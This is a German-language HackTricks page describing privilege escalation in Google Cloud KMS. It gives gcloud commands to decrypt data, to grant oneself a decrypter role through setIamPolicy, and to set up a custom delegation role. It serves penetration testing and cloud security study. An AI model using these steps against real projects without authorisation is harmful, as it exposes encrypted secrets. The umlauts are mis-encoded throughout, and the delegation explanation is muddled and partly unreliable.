# GCP - KMS Privesc

{% hint style="success" %}
Lerne & √ºbe AWS Hacking:<img src="../../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">\
Lerne & √ºbe GCP Hacking: <img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* √úberpr√ºfe die [**Abonnementpl√§ne**](https://github.com/sponsors/carlospolop)!
* **Tritt der** üí¨ [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folge** uns auf **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
* **Teile Hacking-Tricks, indem du PRs zu den** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repos einreichst.

</details>
{% endhint %}

## KMS

Informationen √ºber KMS:

{% content-ref url="../gcp-services/gcp-kms-enum.md" %}
[gcp-kms-enum.md](../gcp-services/gcp-kms-enum.md)
{% endcontent-ref %}

Beachte, dass in KMS die **Berechtigungen** nicht nur von Organisationen, Ordnern und Projekten **vererbt** werden, sondern auch von **Keyrings**.

### `cloudkms.cryptoKeyVersions.useToDecrypt`

Du kannst diese Berechtigung verwenden, um **Informationen mit dem Schl√ºssel zu entschl√ºsseln**, √ºber den du diese Berechtigung hast.
```bash
gcloud kms decrypt \
--location=[LOCATION] \
--keyring=[KEYRING_NAME] \
--key=[KEY_NAME] \
--version=[KEY_VERSION] \
--ciphertext-file=[ENCRYPTED_FILE_PATH] \
--plaintext-file=[DECRYPTED_FILE_PATH]
```
### `cloudkms.cryptoKeys.setIamPolicy`

Ein Angreifer mit dieser Berechtigung k√∂nnte **sich selbst Berechtigungen geben**, um den Schl√ºssel zu verwenden, um Informationen zu entschl√ºsseln.
```bash
gcloud kms keys add-iam-policy-binding [KEY_NAME] \
--location [LOCATION] \
--keyring [KEYRING_NAME] \
--member [MEMBER] \
--role roles/cloudkms.cryptoKeyDecrypter
```
### `cloudkms.cryptoKeyVersions.useToDecryptViaDelegation`

Hier ist eine konzeptionelle Aufschl√ºsselung, wie diese Delegation funktioniert:

1. **Dienstkonto A** hat direkten Zugriff auf die Entschl√ºsselung mit einem bestimmten Schl√ºssel in KMS.
2. **Dienstkonto B** erh√§lt die Berechtigung `useToDecryptViaDelegation`. Dies erm√∂glicht es, KMS zu bitten, Daten im Namen von Dienstkonto A zu entschl√ºsseln.

Die Nutzung dieser **Berechtigung ist implizit in der Art und Weise, wie der KMS-Dienst Berechtigungen √ºberpr√ºft**, wenn eine Entschl√ºsselungsanfrage gestellt wird.

Wenn Sie eine standardm√§√üige Entschl√ºsselungsanfrage √ºber die Google Cloud KMS API (in Python oder einer anderen Sprache) stellen, **√ºberpr√ºft der Dienst, ob das anfragende Dienstkonto die erforderlichen Berechtigungen hat**. Wenn die Anfrage von einem Dienstkonto mit der **`useToDecryptViaDelegation`** Berechtigung gestellt wird, √ºberpr√ºft KMS, ob dieses **Konto berechtigt ist, die Entschl√ºsselung im Namen der Entit√§t, die den Schl√ºssel besitzt, anzufordern**.

#### Einrichtung f√ºr Delegation

1. **Definieren Sie die benutzerdefinierte Rolle**: Erstellen Sie eine YAML-Datei (z. B. `custom_role.yaml`), die die benutzerdefinierte Rolle definiert. Diese Datei sollte die Berechtigung `cloudkms.cryptoKeyVersions.useToDecryptViaDelegation` enthalten. Hier ist ein Beispiel, wie diese Datei aussehen k√∂nnte:
```yaml
title: "KMS Decryption via Delegation"
description: "Allows decryption via delegation"
stage: "GA"
includedPermissions:
- "cloudkms.cryptoKeyVersions.useToDecryptViaDelegation"
```
2. **Erstellen Sie die benutzerdefinierte Rolle mit der gcloud CLI**: Verwenden Sie den folgenden Befehl, um die benutzerdefinierte Rolle in Ihrem Google Cloud-Projekt zu erstellen:

{% code overflow="wrap" %}
```bash
gcloud iam roles create kms_decryptor_via_delegation --project [YOUR_PROJECT_ID] --file custom_role.yaml
```
{% endcode %}

Ersetzen Sie `[YOUR_PROJECT_ID]` durch Ihre Google Cloud-Projekt-ID.

3. **Gew√§hren Sie die benutzerdefinierte Rolle einem Dienstkonto**: Weisen Sie Ihre benutzerdefinierte Rolle einem Dienstkonto zu, das diese Berechtigung verwenden wird. Verwenden Sie den folgenden Befehl:
```bash
# Give this permission to the service account to impersonate
gcloud projects add-iam-policy-binding [PROJECT_ID] \
--member "serviceAccount:[SERVICE_ACCOUNT_B_EMAIL]" \
--role "projects/[PROJECT_ID]/roles/[CUSTOM_ROLE_ID]"

# Give this permission over the project to be able to impersonate any SA
gcloud projects add-iam-policy-binding [YOUR_PROJECT_ID] \
--member="serviceAccount:[SERVICE_ACCOUNT_EMAIL]" \
--role="projects/[YOUR_PROJECT_ID]/roles/kms_decryptor_via_delegation"
```
Ersetzen Sie `[YOUR_PROJECT_ID]` und `[SERVICE_ACCOUNT_EMAIL]` durch Ihre Projekt-ID und die E-Mail des Dienstkontos.

{% hint style="success" %}
Lernen & √ºben Sie AWS Hacking:<img src="../../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">\
Lernen & √ºben Sie GCP Hacking: <img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Unterst√ºtzen Sie HackTricks</summary>

* √úberpr√ºfen Sie die [**Abonnementpl√§ne**](https://github.com/sponsors/carlospolop)!
* **Treten Sie der** üí¨ [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
* **Teilen Sie Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repos senden.

</details>
{% endhint %}
